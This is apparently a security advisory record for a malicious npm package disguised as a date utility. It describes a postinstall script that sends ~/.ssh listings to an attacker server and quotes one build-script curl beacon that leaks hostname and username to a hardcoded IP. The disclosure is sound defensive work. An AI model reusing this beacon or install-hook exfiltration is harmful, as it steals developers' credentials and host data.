summary: Credential reconnaissance package exfiltrating SSH directory contents and host identifiers to hardcoded C2
details: Package presents itself as 'a simple date formatting utility' with a trivial 6-line formatDate wrapper, but ships a postinstall.js that enumerates ~/.ssh (the installer's SSH key directory) and POSTs the listing along with the username and platform to a hardcoded bare IP at 124.221.154.135. The same IP also appears in package.json's build script as `curl http://124.221.154.135/pre?h=$(hostname)&u=$(whoami)`, performing plain-HTTP host reconnaissance using shell command substitution to leak hostname and username. Source comments in postinstall.js (in Chinese) explicitly self-identify the code as targeting SSH private keys and exfiltrating data to an attacker C2 server. The benign date-utility surface is a cover story; both the SSH enumeration script and the build-time recon beacon point at the same attacker-controlled IP, confirming a single C2 attribution. Any developer who installs and runs `npm run build`, or whose install pipeline executes postinstall.js, has their SSH directory contents and host identifiers transmitted to the attacker.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
